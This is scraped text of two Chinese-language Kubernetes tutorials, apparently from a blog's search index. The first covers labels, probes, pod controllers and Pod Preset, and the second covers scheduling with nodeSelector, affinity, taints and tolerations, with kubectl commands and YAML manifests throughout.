pod-template-hash=7cdbd8cdc9,run=nginx\rtest-pod 2/2 Running 0 17h app=myapp-redis,tier=frontend\r-L 获取显示指定类别的资源对象时，对每个资源对象显示其标签值。\n$ kubectl get pods --show-labels -L=run,app\rNAME READY STATUS RESTARTS AGE RUN APP LABELS\rnginx-7cdbd8cdc9-8blzc 1/1 Running 0 11m nginx pod-template-hash=7cdbd8cdc9,run=nginx\rtest-pod 2/2 Running 0 17h myapp-redis app=myapp-redis,tier=frontend\r-l 标签过滤\n$ kubectl get pods --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\rnginx-7cdbd8cdc9-8blzc 1/1 Running 0 14m pod-template-hash=7cdbd8cdc9,run=nginx\rtest-pod 2/2 Running 0 17h app=myapp-redis,tier=frontend\r$ kubectl get pods --show-labels -l app\rNAME READY STATUS RESTARTS AGE LABELS\rtest-pod 2/2 Running 0 17h app=myapp-redis,tier=frontend\r资源对象打标签 kubectl label语法\nkubectl label -f filename|typename key1=value1 ... keyn valuen\r对已有Pod添加标签\n$ kubectl label pod nginx-7cdbd8cdc9-8blzc app=nginx-demo\rpod/nginx-7cdbd8cdc9-8blzc labeled\r修改已有Label值得Pod，需要使用 --overwrite\n$ kubectl label pod nginx-7cdbd8cdc9-8blzc app=nginx-demo\rerror: 'app' already has a value (nginx-demo), and --overwrite is false\r$ kubectl label pod nginx-7cdbd8cdc9-8blzc app=nginx-demo1 --overwrite\rpod/nginx-7cdbd8cdc9-8blzc labeled\r使用复杂格式标签选择器 标签选择器\nKubernetes支持的标签选择器有两类，第一类是基于等值关系的标签选择器，另一类是基于集合关系的标签选择器。\n基于等值关系的选择器\n基于等值关系的标签选择器的操作费无非就是等值关系判断的的符号，如：= == !=\n$ kubectl get pods --show-labels -l app=nginx-demo1\rNAME READY STATUS RESTARTS AGE LABELS\rnginx-7cdbd8cdc9-8blzc 1/1 Running 0 6h app=nginx-demo1,pod-template-hash=7cdbd8cdc9,run=nginx\r$ kubectl get pods --show-labels -l app,tier\rNAME READY STATUS RESTARTS AGE LABELS\rtest-pod 2/2 Running 5 23h app=myapp-redis,tier=frontend\r$ kubectl get pods --show-labels -l app=myapp-redis,tier=frontend\rNAME READY STATUS RESTARTS AGE LABELS\rtest-pod 2/2 Running 5 23h app=myapp-redis,tier=frontend\r基于集合关系的标签选择器。于集合关系的标签选择器。\n基于集合关系就是如下几种类型来进行判断\nkey in(value1,value2..,valueN) key notin(value1,value2,..valueN) 不具有此键也表示符合条件。 key !key 不存在此键的资源 $ kubectl get pods --show-labels -l \u0026quot;app in (nginx-demo1,redus)\u0026quot;\rNAME READY STATUS RESTARTS AGE LABELS\rnginx-7cdbd8cdc9-8blzc 1/1 Running 0 6h15m app=nginx-demo1,pod-template-hash=7cdbd8cdc9,run=nginx\r$ kubectl get pods --show-labels -l \u0026quot;app notin (nginx-demo1,redus)\u0026quot;\rNAME READY STATUS RESTARTS AGE LABELS\rtest-pod 2/2 Running 6 23h app=myapp-redis,tier=frontend\r可以使用标签的不止是Pod，各种对象都可以打标签，包括Node。当节点有标签后，在添加资源时，就可以让资源对节点有倾向性。\n$ kubectl get nodes --show-labels\rNAME STATUS ROLES AGE VERSION LABELS\rnode02.k8s.test Ready [none] 3d1h v1.13.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/hostname=node02.k8s.test\rnode03.k8s.test Ready [none] 3d1h v1.13.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/hostname=node03.k8s.test\rPod的生命周期 常见的Pod状态：\nPending 挂起，请求创建Pod时，发现条件不满足，调度尚未完成 running Failed Success Unkown，未知状态。Pod的状态是Apiserver与运行Pod的节点上的Kubelet通信获取状态信息的。当Node节点上Kubelet进程发生故障。Apiserver无法获取Pod信息。\nPod的创建过程：\n用户创建Pod时，将请求提交给Apiserver，Apiserver将创建请求的目标状态保存在etcd中，而后apiserver请求scheduler进行调度（负责挑选出合适的节点来运行Pod）。并将调度结果保存至etcd的Pod资源信息中。随后目标节点kubelet通过apiserver的状态变化，拿到用户所提交的创建清单。根据清单在当前节点上创建并运行Pod，并将当前结果状态发送给apiserver，由apiserver将此状态信息存至etcd中。\nrestartPolicy: 重启策略 Always 总是重启, OnFailure 只有其状态为错误时重启，正常终止时不重启, Never 从不重启. Default to Always.\n容器的重启策略\nPod在被调度至某一节点之上时，只要此节点存在，Pod不会被重新调度，只会重启。除非Pod删除或Pod存在节点故障才会被重新调度。\nPod的终止过程\n在kubenetes集群中，Pod代表在Kubernetes集群节点上运行的程序或进程，是向用户提供服务的主要单位。当在提交删除一个Pod时，不会直接kill删除的，而是向Pod内的每一个容器发送TEAM终止信号，使Pod中容器正常终止。终止默认有30秒宽限期。宽限期结束，依然无法终止，会重新发送kill信号，强行进行终止。\nkubernetes中的探测方式 所谓的容器探测无非就是，在容器中设置一些探针或传感器来获取相应的数据。作为其存活与否、就绪与否的标准。目前来讲Kubernetes所支持的存货性探测方式和就绪行探测方式都是一样的。\nKubernetes中的探针类型有三种ExecAction，TCP套接字探针 TCPSocketAction ，HTTPGetAction，使用kubectl explain pod.containers.xxx获取帮助信息。\nlivenessProbe实例 apiVersion: v1\rkind: Pod\rmetadata: name: liveness-pod\rnamespace: default\rspec:\rcontainers:\r- name: liveness-container\rimage: busybox\rimagePullPolicy: IfNotPresent\rcommand: [\u0026quot;/bin/sh\u0026quot;,\u0026quot;-c\u0026quot;,\u0026quot;touch /tmp/healthy; sleep 20; rm -fr /tmp/healthy; sleep 3600\u0026quot;]\rlivenessProbe:\rexec:\rcommand: [\u0026quot;test\u0026quot;,\u0026quot;-e\u0026quot;,\u0026quot;/tmp/healthy\u0026quot;]\rinitialDelaySeconds: 3\rperiodSeconds: 2\rsuccessThreshold: 1\r在创建后使用describe查看错误\n$ kubectl describe pod liveness-pod\rName: liveness-pod\rNamespace: default\rPriority: 0\rPriorityClassName: [none]\rNode: node03.k8s.test/10.0.0.17\rStart Time: Thu, 10 Jan 2019 18:36:27 +0800\rLabels: [none]\rAnnotations: [none]\rStatus: Running\rIP: 10.244.1.9\rContainers:\rliveness-container:\rContainer ID: docker://10062f9026968e664fbb128ddb33a14e30efc848e914fe12d769bab9180ab21a\rImage: busybox\rImage ID: docker-pullable://busybox@sha256:7964ad52e396a6e045c39b5a44438424ac52e12e4d5a25d94895f2058cb863a0\rPort: [none]\rHost Port: [none]\rCommand:\r/bin/sh\r-c\rtouch /tmp/healthy; sleep 20; rm -fr /tmp/healthy; sleep 3600\rState: Running\rStarted: Thu, 10 Jan 2019 18:39:17 +0800\rLast State: Terminated\rReason: Error\rExit Code: 137\rStarted: Thu, 10 Jan 2019 18:38:22 +0800\rFinished: Thu, 10 Jan 2019 18:39:17 +0800\rReady: True\rRestart Count: 3\rLiveness: exec [test -e /tmp/healthy] delay=3s timeout=1s period=2s #success=1 #failure=3\rEnvironment: [none]\rMounts:\r/var/run/secrets/kubernetes.io/serviceaccount from default-token-ml2gd (ro)\rConditions:\rType Status\rInitialized True Ready True ContainersReady True PodScheduled True Volumes:\rdefault-token-ml2gd:\rType: Secret (a volume populated by a Secret)\rSecretName: default-token-ml2gd\rOptional: false\rQoS Class: BestEffort\rNode-Selectors: [none]\rTolerations: node.kubernetes.io/not-ready:NoExecute for 300s\rnode.kubernetes.io/unreachable:NoExecute for 300s\r可以看到根据定义的检测规则，Pod在不停的重启。\n$ kubectl get pods\rNAME READY STATUS RESTARTS AGE\rliveness-pod 1/1 Running 8 17m\rreadinessProbe，就绪性探测实例 编写yaml文件，使用HTTPAction探针进行就绪性探测\napiVersion: v1\rkind: Pod\rmetadata:\rname: http-pod\rnamespace: default\rspec:\rcontainers:\r- name: http-container\rimage: httpd\rimagePullPolicy: IfNotPresent\rports:\r- name: http\rcontainerPort: 80\rreadinessProbe:\rhttpGet:\rport: http\rpath: /index.html\rinitialDelaySeconds: 2\rperiodSeconds: 3\r使用资源配置清单创建Pod，并查看其状态\n$ kubectl create -f http.yaml pod/http-pod created\r$ kubectl get pods\rNAME READY STATUS RESTARTS AGE\rhttp-pod 1/1 Running 0 6s\r查看此Pod的就绪性。\n$ kubectl describe pod http-pod\rName: http-pod\rNamespace: default\rPriority: 0\rPriorityClassName: [none]\rNode: node02.k8s.test/10.0.0.16\rStart Time: Fri, 11 Jan 2019 11:34:36 +0800\rLabels: [none]\rAnnotations: [none]\rStatus: Running\rIP: 10.244.0.18\rContainers:\rhttp-container:\rContainer ID: docker://562525c9498153ed0285d6fdaa03b822efca470194341f12e5f510ae9e93f570\rImage: httpd\rImage ID: docker-pullable://httpd@sha256:a613d8f1dbb35b18cdf5a756d2ea0e621aee1c25a6321b4a05e6414fdd3c1ac1\rPort: 80/TCP\rHost Port: 0/TCP\rState: Running\rStarted: Fri, 11 Jan 2019 11:34:38 +0800\rReady: True\rRestart Count: 0\rReadiness: http-get http://:http/index.html delay=2s timeout=1s period=3s #success=1 #failure=3\rEnvironment: [none]\rMounts:\r/var/run/secrets/kubernetes.io/serviceaccount from default-token-ml2gd (ro)\rConditions:\rType Status\rInitialized True Ready True ContainersReady True PodScheduled True Volumes:\rdefault-token-ml2gd:\rType: Secret (a volume populated by a Secret)\rSecretName: default-token-ml2gd\rOptional: false\rQoS Class: BestEffort\rNode-Selectors: [none]\rTolerations: node.kubernetes.io/not-ready:NoExecute for 300s\rnode.kubernetes.io/unreachable:NoExecute for 300s\rEvents:\rType Reason Age From Message\r---- ------ ---- ---- -------\rNormal Scheduled 11s default-scheduler Successfully assigned default/http-pod to node02.k8s.test\rNormal Pulled 9s kubelet, node02.k8s.test Container image \u0026quot;httpd\u0026quot; already present on machine\rNormal Created 9s kubelet, node02.k8s.test Created container\rNormal Started 9s kubelet, node02.k8s.test Started container\r手动接入Pod内，将探测的文件删除。此时查看Pod的就绪性如下。提示404\nkubectl exec -it http-pod -- /bin/bash\r此时，Pod就绪的容器量为0个，也就是说，容器中httpd进程正常，但是web页面不存在。\n$ kubectl get pods NAME READY STATUS RESTARTS AGE\rhttp-pod 0/1 Running 0 3h39m\r$ kubectl describe pod http-pod\rName: http-pod\rNamespace: default\rPriority: 0\rPriorityClassName: [none]\rNode: node02.k8s.test/10.0.0.16\rStart Time: Fri, 11 Jan 2019 11:34:36 +0800\rLabels: [none]\rAnnotations: [none]\rStatus: Running\rIP: 10.244.0.18\rContainers:\rhttp-container:\rContainer ID: docker://562525c9498153ed0285d6fdaa03b822efca470194341f12e5f510ae9e93f570\rImage: httpd\rImage ID: docker-pullable://httpd@sha256:a613d8f1dbb35b18cdf5a756d2ea0e621aee1c25a6321b4a05e6414fdd3c1ac1\rPort: 80/TCP\rHost Port: 0/TCP\rState: Running\rStarted: Fri, 11 Jan 2019 11:34:38 +0800\rReady: False\rRestart Count: 0\rReadiness: http-get http://:http/index.html delay=2s timeout=1s period=3s #success=1 #failure=3\rEnvironment: [none]\rMounts:\r/var/run/secrets/kubernetes.io/serviceaccount from default-token-ml2gd (ro)\rConditions:\rType Status\rInitialized True Ready False ContainersReady False PodScheduled True Volumes:\rdefault-token-ml2gd:\rType: Secret (a volume populated by a Secret)\rSecretName: default-token-ml2gd\rOptional: false\rQoS Class: BestEffort\rNode-Selectors: [none]\rTolerations: node.kubernetes.io/not-ready:NoExecute for 300s\rnode.kubernetes.io/unreachable:NoExecute for 300s\rEvents:\rType Reason Age From Message\r---- ------ ---- ---- -------\rNormal Scheduled 3h39m default-scheduler Successfully assigned default/http-pod to node02.k8s.test\rNormal Pulled 3h39m kubelet, node02.k8s.test Container image \u0026quot;httpd\u0026quot; already present on machine\rNormal Created 3h39m kubelet, node02.k8s.test Created container\rNormal Started 3h39m kubelet, node02.k8s.test Started container\rWarning Unhealthy 0s (x10 over 27s) kubelet, node02.k8s.test Readiness probe failed: HTTP probe failed with statuscode: 404\rlifecycle 生命周期，用来定义启动后和终止前钩子\nlifecycle\npostStart Pod在创建启动之后立即执行的操作。如果执行失败，容器会终止，被重启，重启与否取决于重启策略。\npreSTop Pod在终止之前立即被执行的命令。命令执行完毕后，Pod才会被终止。\n⚠ 注意：注意两个command的执行顺序containers.command是定义容器的command，containers.postStart.exec.command是定义容器启动后初始化操作 许多资源支持内嵌字段定义其使用的标签选择器： matchLabels：直接给定key value service只支持此类 matchExpressions：基于给定的表达式定义使用的标签选择器{key:\u0026quot;KEY\u0026quot;,operator:\u0026quot;OPERATOR\u0026quot;,values:[VAL1,VAL2,...]。\n操作符： In，Notin：values必须为非空列表 Exists，NotExists：values必须为空列表。\nPod控制器都是内嵌Pod模板，\nPod控制器去管理Pod中间层，并确保每一个Pod资源始终处于定义、或所期望的目标状态。当Pod状态出现故障，首先尝试重启容器，\nPod控制器有多种类型\nReplicaSet：ReplicaSet被称为新一代的ReplicationController，它的核心作用在于代用户创建指定数量的副本，并确保Pod副本一直处于满足用户期望数量的状态，多退少补。还支持自动扩缩容机制。 主要有三个组件组成\n用户期望Pod副本数量 标签选择器，以便选定由自己管理控制的Pod副本。 Pod资源模板 通过标签选择器选到的标签副本数量低于指定数量，会使用Pod资源模板完成Pod资源的新建。\n帮助用户管理无状态的Pod资源，并确保精确反应用户所定义的目标数量，但是Kubernetes不建议直接使用ReplicaSet\nDeployment\nDeployment工作于ReplicaSet之上，一个Deployment可以管理多个rs，但是存活的（），通常保留历史版本中的10个。Deployment通过控制ReplicaSet来控制Pod。Deployment除了支持ReplicaSet所支持的功能，还支持滚动更新、回滚等机制，而且还提供了声明式配置的功能。是用来管理无状态应用的目前最佳的Pod控制器。\nDeployment能提供滚动式自定义、自控制的更新。 Deployment在更新时可控制更新节奏和更新逻辑。 声明式配置在创建资源时，可以基于声明逻辑来定义，所有更新的资源可以随时重新进行声明，只要资源支持动态运行时修改，就可以随时改变在apiserver上定义的目标期望状态。\nPod副本数量是有可能大于节点数的，并且数量本身彼此间没有任何精确对应关系。 DaemonSet\n用于确保集群的每一个节点或指定条件的节点上只运行一个特定的Pod副本，通常用于实现系统级的后台任务。\nJob 只能执行一次性的作业 CronJob 周期性运行作业，每次运行都有正常退出的时间 不需要持续后台运行。如果前一次任务没有完成，下一次时间点又到了，CronJob还需要处理此类问题\n区别\nJob和CronJob与DaemonSet和Deployment显著区别就在于，Job和CronJob不需要持续后台运行。\nDeployment只能用于管控无状态应用。常用于只关注群体，而不必关注个体的场景。\nStatefulSet能够实现管理有状态应用，而且每一个应用，每一个Pod副本都是被单独管理的。他拥有自己的独有标识和独有的数据集，一旦节点发生故障，在加进来之前需要进行初始化操作。\nStatefulSet提供了封装控制器，将需要人为手动做的操作、复杂的执行逻辑，定义成脚本，放置在StatefulSet Pod模板的定义当中。每次节点故障，通过脚本可自动恢复状态。\nReplicaSet的使用\nReplicaSet定义方式可以使用kubectl explain rs查看帮助，ReplicaSet使用的apps组中的v1，而不在是core组。内嵌字段与Pod类似，而spec中定义时最核心的只有3个 relicas副本数量、selector 标签选择器 templates Pod模板，对于templates而言，其内部就是Pod模板。\n使用ReplicaSet创建Pod\nlabels中的标签，必须符合selector中的选择标准。否则创建的Pod是无用的，创建Pod都不够relicas定义的数量，它将会永久创建下去。\n在Pod模板中起的Pod名称是没有用的，它会自动以控制器的名称后跟一串随机串，来作为Pod名称来创建。\n当Pod控制器数量超出用户期望数量，会随机删除其中一个Pod\n$ kubectl get pods --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\rrs-5xw7l 1/1 Terminating 0 40m app=myapp,release=canary,test=1a\rrs-6zx6b 1/1 Running 0 40m app=myapp,release=canary,test=1a\rtest-pod 2/2 Running 0 46m app=myapp,release=canary\r$ kubectl label pods test-pod release=canary\rpod/test-pod labeled\r$ kubectl get pods --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\rrs-5xw7l 1/1 Terminating 0 40m app=myapp,release=canary,test=1a\rrs-6zx6b 1/1 Running 0 40m app=myapp,release=canary,test=1a\rtest-pod 2/2 Running 0 46m app=myapp,release=canary\r$ kubectl get pods --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\rrs-6zx6b 1/1 Running 0 42m app=myapp,release=canary,test=1a\rtest-pod 2/2 Running 0 47m app=myapp,release=canary\rReplicaSet动态规模的扩容、缩容\n修改了控制器后，Pod资源并不会随之更改，因为Pod资源足额就不会被重建，只有重建的Pod资源的版本才是新版本的。\nPod Preset Pod Preset 是一种 API 资源，在 Pod 创建时，用户可以用它将额外的将运行时需求信息注入 Pod内。 使用标签选择算符来指定 Pod Preset 所适用的 Pod。\n在集群中启动Pod Preset 在集群中使用 Pod Preset，必须确保以下几点：\n需要确保你使用的是kubernetes 1.8版本以上 已启用 API 类型 settings.k8s.io/v1alpha1/podpreset 已启用准入控制器 PodPreset apiserver添加参数 --enable-admission-plugins --runtime-config --enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset \\\r--runtime-config=settings.k8s.io/v1alpha1=true\r创建一个PodPreset\napiVersion: settings.k8s.io/v1alpha1\rkind: PodPreset\rmetadata:\rname: time-preset\rnamespace: default\rspec:\rselector:\rmatchLabels:\rvolumeMounts:\r- mountPath: /etc/localtime\rname: time\rvolumes:\r- name: time\rhostPath:\rpath: /etc/localtime\renv:\r- name: ENVOY_END\rvalue: envoy-1.15\r特定Pod禁用Pod Preset 在 Pod 的 .spec 中添加形如 podpreset.admission.kubernetes.io/exclude: \u0026quot;true\u0026quot; 的注解\napiVersion: apps/v1\rkind: Deployment\rmetadata:\rname: podpreset-deply\rlabels:\rapp: podpreset-deply\rspec:\rreplicas: 1\rselector:\rmatchLabels:\rapp: podpreset-deply\rtemplate:\rmetadata:\rname: podpreset-deply\rlabels:\rapp: podpreset-deply\rannotations:\rpodpreset.admission.kubernetes.io/exclude: \u0026quot;true\u0026quot;\rspec:\rcontainers:\r- name: envoy-end\rimage: sealloong/envoy-end\rimagePullPolicy: IfNotPresent\rrestartPolicy: Always\rReference\nopenshift\nkubernetes-pod preset\n","permalink":"https://www.oomkill.com/2018/09/kubernetes-pod-controller/","summary":"","title":"kubernetes概念 - Kubernetes Pod控制器"},{"content":"Overview kube-scheduler 是kubernetes控制平面的核心组件，其默认行为是将 pod 分配给节点，同时平衡Pod与Node间的资源利用率。通俗来讲就是 kube-scheduler 在运行在控制平面，并将工作负载分配给 Kubernetes 集群。\n本文将深入 Kubernetes 调度的使用，包含：”一般调度”，”亲和度“，“污点与容忍的调度驱逐”。最后会分析下 Scheduler Performance Tuning，即微调scheduler的参数来适应集群。\n简单的调度 NodeName [1] 最简单的调度可以指定一个 NodeName 字段，使Pod可以运行在对应的节点上。如下列资源清单所示\napiVersion: v1 kind: Pod metadata: name: netpod spec: containers: - name: netbox image: cylonchau/netbox nodeName: node01 通过上面的资源清单Pod最终会在 node01上运行。这种情况下也会存在很多的弊端，如资源节点不足，未知的nodename都会影响到Pod的正常工作，通常情况下，这种方式是不推荐的。\n$ kubectl describe pods netpod Name: netpod Namespace: default ... QoS Class: BestEffort Node-Selectors: \u0026lt;none\u0026gt; Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s node.kubernetes.io/unreachable:NoExecute for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Pulling 86s kubelet Pulling image \u0026quot;cylonchau/netbox\u0026quot; Normal Pulled 17s kubelet Successfully pulled image \u0026quot;cylonchau/netbox\u0026quot; Normal Created 17s kubelet Created container netbox Normal Started 17s kubelet Started container netbox $ kubectl get pods netpod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES netpod 1/1 Running 0 48m 192.168.0.3 node01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 通过上面的输出可以确定，通过 NodeName 方式是不经过 scheduler 调度的\nnodeSelector [2] label 是 kubernetes中一个很重要的概念，通常情况下，每一个工作节点都被赋予多组 label ,可以通过命令查看对应的 label 。\n$ kubectl get node node01 --show-labels NAME STATUS ROLES AGE VERSION LABELS node01 Ready \u0026lt;none\u0026gt; 15h v1.18.20 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node01,kubernetes.io/os=linux 而 nodeSelector 就是根据这些 label ，来选择具有特定一个或多个标签的节点。例如，如果需要在一组特定的节点上运行pod，可以设置在 “PodSpec” 中定义nodeSelector 为一组键值对：\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-nodeselector spec: selector: matchLabels: app: netpod replicas: 2 template: metadata: labels: app: netpod spec: containers: - name: netbox image: cylonchau/netbox nodeSelector: beta.kubernetes.io/os: linux 对于上面的pod来讲，Kubernetes Scheduler 会找到带有 beta.kubernetes.io/os: linux标签的节点。对于更多kubernetes内置的标签，可以参考 [3]\n对于标签选择器来说，最终会分布在具有标签的节点上\nkubectl describe pod netpod-nodeselector-69fdb567d8-lcnv6 Name: netpod-nodeselector-69fdb567d8-lcnv6 Namespace: default ... QoS Class: BestEffort Node-Selectors: beta.kubernetes.io/os=linux Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s node.kubernetes.io/unreachable:NoExecute for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 8m18s default-scheduler Successfully assigned default/netpod-nodeselector-69fdb567d8-lcnv6 to node01 Normal Pulling 8m17s kubelet Pulling image \u0026quot;cylonchau/netbox\u0026quot; Normal Pulled 7m25s kubelet Successfully pulled image \u0026quot;cylonchau/netbox\u0026quot; Normal Created 7m25s kubelet Created container netbox Normal Started 7m25s kubelet Started container netbox 节点亲和性 [4] 对于使用了调度功能的系统来说，亲和度 （Affinity）是个很常见的概念，通常亲和度发生在并行（parallel ）环境中；在这种环境下，亲和度提供了在一个节点上运行pod可能比在其他节点上运行更有效，而计算亲和度通常由多种条件组成。一般情况下，亲和度分为“软亲和与硬亲和\n软亲和，Soft Affinity，是调度器尽可能将任务保持在同一个节点上。这只是一种尝试；如果不可行，则将进程迁移到另一个节点 硬亲和，Hard affinity，硬亲和度是强行将任务绑定到指定的节点上 而在kubernetes中也支持亲和度的概念，而亲和度是与 nodeSelector 配合形成的一个算法。其中硬亲和被定义为requiredDuringSchedulingIgnoredDuringExecution；软亲和被定义为 preferredDuringSchedulingIgnoredDuringExecution\n硬亲和性（requiredDuringSchedulingIgnoredDuringExecution）：必须满足条件，否则调度程序无法调度 Pod。 软亲和性 （preferredDuringSchedulingIgnoredDuringExecution）：scheduler 将查找符合条件的节点。如果没有满足要求的节点将忽略这条规则，scheduler 将仍会调度 Pod。 Node Affinity Node Affinity参数说明 调度程序会更倾向于将 pod 调度到满足该字段指定的亲和性表达式的节点，但它可能会选择违反一个或多个表达式的节点。最优选的节点是权重总和最大的节点，即对于满足所有调度要求（资源请求、requiredDuringScheduling 亲和表达式等）的每个节点，通过迭代该字段的元素来计算总和如果节点匹配相应的matchExpressions，则将“权重”添加到总和中；具有最高和的节点是最优选的。\n如果在调度时不满足该字段指定的亲和性要求，则不会将 Pod 调度到该节点上。如果在 pod 执行期间的某个时间点不再满足此字段指定的亲和性要求（例如，由于更新），系统可能会或可能不会尝试最终将 pod 从其节点中逐出。\naffinity 范围应用于 Pod.Spec 下，参数如下：\nnodeAffinity：node亲和度相关根配置 preferredDuringSchedulingIgnoredDuringExecution：软亲和 preference (required)：选择器 matchExpressions：匹配表达式，标签可以指定部分 key (\u0026lt;string\u0026gt; -required-)： operator (\u0026lt;string\u0026gt; -required-)：# 与一组 key-values的运算方式。 In, NotIn, Exists, DoesNotExist, Gt, Lt。 values (\u0026lt;[]string\u0026gt;)： matchFields： 匹配字段 key (\u0026lt;string\u0026gt; -required-)： operator (\u0026lt;string\u0026gt; -required-)：# 与一组 key-values的运算方式。 In, NotIn, Exists, DoesNotExist, Gt, Lt。 values (\u0026lt;[]string\u0026gt;)： weight (required)：范围为 1-100，具有最高和的节点是最优选的 requiredDuringSchedulingIgnoredDuringExecution：硬亲和 nodeSelectorTerms matchExpressions： key (\u0026lt;string\u0026gt; -required-)： operator (\u0026lt;string\u0026gt; -required-)：# 与一组 key-values的运算方式。 In, NotIn, Exists, DoesNotExist, Gt, Lt。 values (\u0026lt;[]string\u0026gt;)： matchFields： key (\u0026lt;string\u0026gt; -required-)： operator (\u0026lt;string\u0026gt; -required-)：一组 key-values 的运算方式。 In, NotIn, Exists, DoesNotExist, Gt, Lt。 values (\u0026lt;[]string\u0026gt;)： Notes: matchFields使用的是资源清单的字段（kubectl get node -o yaml），而matchExpressions匹配的是标签\nNode Affinity示例 上面的介绍了解到了Kubernetes中相对与 nodeSelector可以更好表达复杂的调度需求：节点亲和性，使用PodSpec中的字段 .spec.affinity.nodeAffinity 指定相关 affinity 配置。\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-nodeselector spec: selector: matchLabels: app: netpod replicas: 2 template: metadata: labels: app: netpod spec: containers: - name: netbox image: cylonchau/netbox affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: app operator: In values: - test 上面的清单表明，当节点存在 app: test 标签时，会调度到对应的Node上，如果没有节点匹配这些条件也不要紧，会根据普通匹配进行调度。\n当硬策略和软策略同时存在时的情况，根据设置的不同，硬策略优先级会高于软策略，哪怕软策略权重设置为100\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-nodeselector spec: selector: matchLabels: app: netpod replicas: 2 template: metadata: labels: app: netpod spec: containers: - name: netbox image: cylonchau/netbox affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: app operator: In values: - test requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: topology.kubernetes.io/zone operator: In values: - antarctica-east1 - antarctica-west1 下面是报错信息\nWarning FailedScheduling 4s (x3 over 24s) default-scheduler 0/2 nodes are available: 2 node(s) didn't match node selector. Pod亲和性 [4] pod亲和性和反亲和性是指根据节点上已运行的Pod的标签而不是Node标签来限制Pod可以在哪些节点上调度。例如：X 满足一个或多个运行 Y 的条件，这个时候 Pod满足在X中运行。其中 X 为拓扑域，Y 则是规则。\nNotes：官方文档中不推荐pod亲和度在超过百个节点的集群中使用该功能 [5]\nPod亲和性配置 Pod亲和性和反亲和性与Node亲和性类似，affinity 范围应用于 Pod.Spec.podAffinity 下，这里不做重复复述，可以参考Node亲和性参数说明部分。\ntopologyKey，==不允许是空值==，该值将影响Pod部署的位置，影响范围为，与亲和性条件匹配的对应的节点中的什么拓扑，topologyKey的拓扑域由label标签决定。\n除了 topologyKey 之外，还有标签选择器 labelSelector 与 名称空间 namespaces 可以作为同级的替代选项\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-podaffinity spec: selector: matchLabels: app: podaffinity replicas: 1 template: metadata: labels: app: podaffinity spec: containers: - name: podaffinity image: cylonchau/netbox affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - netpod topologyKey: zone 如果没有Pod匹配到规则，则pending状态\nWarning FailedScheduling 59s (x2 over 59s) default-scheduler 0/2 nodes are available: 2 node(s) didn't match pod affinity rules, 2 node(s) didn't match pod affinity/anti-affinity. Pod Anti-Affinity 在某些场景下，部分节点不应该有很多资源，即某些节点不想被调度。例如监控运行节点由于其性质，不希望该节点上有很多资源，或者因节点配置的不同，配置较低节点不希望调度很多资源；在这种情况下，如果将符合预期之外的Pod调度过来会降低其托管业务的性能。这种情况下就需要 反亲和度（Anti-Affinity）来使Pod远离这组节点\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-podaffinity spec: selector: matchLabels: app: podaffinity replicas: 1 template: metadata: labels: app: podaffinity spec: containers: - name: podaffinity image: cylonchau/netbox affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - netpod topologyKey: zone Taints And Tolerations [6] Taints 亲和度和反亲和度虽然可以阻止Pod在特定节点上运行，但还存在一个问题，就是亲和度和反亲和度需要声明运行的节点或者是不想运行的节点，如果忘记声明，还是会被调度到对应的Node上。Kubernetes还提供了一种驱逐Pod的方法，就是污点（Taints）与容忍（Tolerations）。\n创建一个污点\nkubectl taint nodes node1 key1=value1:NoSchedule $ kubectl taint nodes mon01 role=monitoring:NoSchedule 删除一个污点，\nkubectl taint nodes node1 key1=value1:NoSchedule- 除了 NoSchedule ，还有 PreferNoSchedule 与 NoExecute\nPreferNoSchedule ：类似于软亲和性的属性，尽量去避免污点，但不是强制的。 NoExecute 表示，当Pod还没在节点上运行时，并且存在至少一个污点时生效，此时Pod不会被调度到该节点；当Pod已经运行在节点上时，并且存在至少一个污点时生效，Pod将会从节点上被驱逐。 Tolerations 当Node有污点时，在调度时会自动被排除。当调度在受污染的节点上执行Predicate部分时将失败，而容忍度则是使 pod 具有对该节点上的污点进行容忍，即拥有容忍度的Pod可以调度到有污点的节点之上。\napiVersion: apps/v1 kind: Deployment metadata: name: netpod-podaffinity spec: selector: matchLabels: app: podaffinity replicas: 1 template: metadata: labels: app: podaffinity spec: containers: - name: podaffinity image: cylonchau/netbox tolerations: - key: \u0026quot;role\u0026quot; operator: \u0026quot;Equal\u0026quot; value: \u0026quot;monitoring\u0026quot; effect: \u0026quot;NoSchedule\u0026quot; affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - netpod topologyKey: zone 容忍度中存在一个特殊字段 TolerationSeconds ，表示容忍的时间，默认不会设置，即永远容忍污点。设置成0或者负数表示理解驱逐。==仅在污点为 NoExecute 时生效==\noperator 属性有两个值 Exists 和 Equal\n如果 operator 为 Exists，则无需 value 